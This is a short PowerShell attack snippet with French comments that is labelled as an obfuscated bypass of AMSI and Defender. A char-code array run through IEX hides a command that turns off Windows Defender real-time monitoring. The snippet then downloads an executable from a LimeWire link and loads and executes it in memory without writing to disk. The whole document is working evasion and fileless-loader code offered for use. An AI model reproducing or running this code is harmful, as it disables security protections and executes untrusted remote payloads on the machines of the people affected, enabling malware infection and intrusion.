# Bypass AMSI + Defender cloud (obfusqué 2025)
IEX([char[]](83,101,116,45,77,112,80,114,101,102,101,114,101,110,99,101,32,45,68,105,115,97,98,108,101,82,101,97,108,116,105,109,101,77,111,110,105,116,111,114,105,110,103,32,36,116,114,117,101)|%{[char]$_})

# Charge ton exe en mémoire et exécute (0 disque)
$bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
$asm = [Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null,$null)
